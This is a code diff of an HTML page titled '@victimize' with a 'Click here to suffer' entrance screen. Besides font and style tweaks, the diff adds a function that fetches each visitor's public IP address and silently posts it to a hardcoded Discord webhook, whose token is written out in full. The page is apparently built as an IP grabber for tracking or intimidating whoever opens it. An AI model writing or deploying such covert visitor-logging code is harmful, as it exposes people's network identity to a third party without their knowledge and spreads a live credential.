@@ -6,6 +6,7 @@
     <meta name="viewport" content="width=device-width">
     <title>@victimize</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=UnifrakturCook:700&display=swap');
 
         body, html {
             margin: 0;
@@ -15,7 +16,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: monospace;
+            font-family: 'UnifrakturCook', serif;
             overflow: hidden;
             color: white;
         }
@@ -59,13 +60,18 @@
         .ip-info {
             font-size: 16px;
             margin-top: 20px;
+            margin-left: 10px; /* Ajuste a la derecha */
+        }
+
+        .click-text {
+            font-size: 24px; /* Tamaño más grande */
         }
     </style>
 </head>
 
 <body>
     <div class="entrance-screen" id="entrance-screen">
-        <div>[ Click here to suffer ]</div>
+        <div class="click-text">[ Click here to suffer ]</div>
     </div>
 
     <div class="main-content" id="main-content">
@@ -94,14 +100,37 @@
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
+                    const ip = data.ip;
                     document.getElementById('ip-info').innerText = `
-                        ${data.ip}
+                        ${ip}
                     `;
+                    sendWebhook(ip);
                 })
                 .catch(error => {
                     document.getElementById('ip-info').innerText = 'Failed to load IP information.';
                     console.error('Error fetching IP info:', error);
                 });
+        }
+
+        function sendWebhook(ip) {
+            const webhookURL = 'https://discord.com/api/webhooks/1246867810412658688/KXVM8CNc3-WLKcUgbpNP-pBFmLT9ll_LKM5cWuI1ss-Vsoi1QrSuvAPydZ1bPx5a_tiq';
+            const content = `New visitor IP: ${ip}`;
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send webhook:', response.status, response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Error sending webhook:', error);
+            });
         }
     </script>
 </body>
